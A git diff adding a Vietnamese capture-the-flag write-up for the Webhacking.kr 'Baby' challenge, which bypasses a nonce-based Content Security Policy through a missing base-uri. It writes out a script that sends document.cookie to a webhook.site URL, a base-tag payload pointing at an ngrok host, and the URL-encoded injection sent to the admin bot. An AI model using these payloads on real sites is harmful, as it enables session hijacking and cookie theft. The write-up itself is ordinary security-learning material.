@@ -210,6 +210,51 @@ Gửi lên và chờ kết quả:
 
 > `ADMIN_COOKIE=SY2USDIH78TF3DFU78546TE7F`
 
+# Webhacking.kr:
+## Baby
+Xem qua web và source code thì em nhận thấy biến `inject` có thể là nơi xss và chức năng report là gửi url đến admin, chức năng này là thẻ a và được tạo ra từ file `script.js`.
+![image](https://user-images.githubusercontent.com/92881216/224082610-833427cc-e04d-4183-b4cc-fe78a2a9d2cb.png)
+
+![image](https://user-images.githubusercontent.com/92881216/224082906-2bb1fb70-2f5a-41c8-ab5b-5505a6f25069.png)
+
+![image](https://user-images.githubusercontent.com/92881216/224082985-62c0d449-db1a-410d-bd0a-f1a1d4fec103.png)
+
+Đầu tiên em thử với payload đơn gián : `<h1>abc</h1>` được :
+![image](https://user-images.githubusercontent.com/92881216/224084380-12b218b6-894f-4ae5-b398-c43cbc4f290c.png)
+
+Tiếp tục với payload `<script>alert(1)</script>` nhưng không có gì xảy ra, em check thử source thì không có gì thay đổi ở payload :
+
+![image](https://user-images.githubusercontent.com/92881216/224084797-94c2db89-9e3b-42b1-8235-38a730107ec3.png)
+
+Tuy nhiên script không được thực thi, em check lại header và biết được web được bảo vệ bởi CSP :
+
+![image](https://user-images.githubusercontent.com/92881216/224085505-b667c2fb-6be7-4bfd-b615-9ff089e54b1a.png)
+
+Với header là  `Content-Security-Policy: script-src 'nonce-QUrU8F7+Vi+GbEFLIHSJxt52Gm8=';` Như vậy giá trị `nonce` được gán vào tag `script` và tag `script` có giá trị `nonce` đó mới được thực thi. Đây là giá trị ngẫu nhiên và được làm mới sau mỗi lần refresh trang và để biết trước được là điều bất khả thi. Em tiếp tục tìm kiếm cách bypass loại này và xem đc bài này : https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#missing-base-uri
+
+Thẻ `script` trong bài này được gắn attribute `scr=/script.js` và web thực thi nội dung trong file script.js. Đây là đường dẫn tương đối và base-uri chưa được định nghĩa và vì vậy ta thể tạo ra một thẻ `base` để xác định base-uri. Ví dụ về thẻ base: `<base href="https://www.attacker.com/">` và khi đó script.js sẽ có đường dẫn tuyệt đối là : `https://www.attacker.com/script.js` và kẻ tấn công có thể thực thi file script.js này của hắn lên ứng dụng web.
+Cách thức là vậy, bây giờ em sẽ tiến hành tạo file `script.js` để lấy cookie có nội dung:
+```
+document.location ="https://webhook.site/509048d1-6397-4a3f-ac0f-9133e64a24dd?c=" + document.cookie;
+```
+Cùng với đó là một web server chứa file scrip.js : `https://12bc-42-1-70-84.ap.ngrok.io` sao cho:
+
+![image](https://user-images.githubusercontent.com/92881216/224092598-015a4190-6d83-4ce4-a043-e058390dca3c.png)
+
+Và bây giờ tạo thẻ base đưa vào `?inject=`:
+```
+<base href="https://12bc-42-1-70-84.ap.ngrok.io/" >
+```
+Cuối cùng là mã hóa URL và gửi cho admin:
+```
+?inject=%3Cbase%20href=%22https://12bc-42-1-70-84.ap.ngrok.io/%22%20%3E
+```
+Kết quả:
+
+![image](https://user-images.githubusercontent.com/92881216/224093333-dd33b73d-16dc-4f56-a93e-5b583d1eda1f.png)
+
+> `flag=FLAG{base_is_basic}`
+
 
 
 
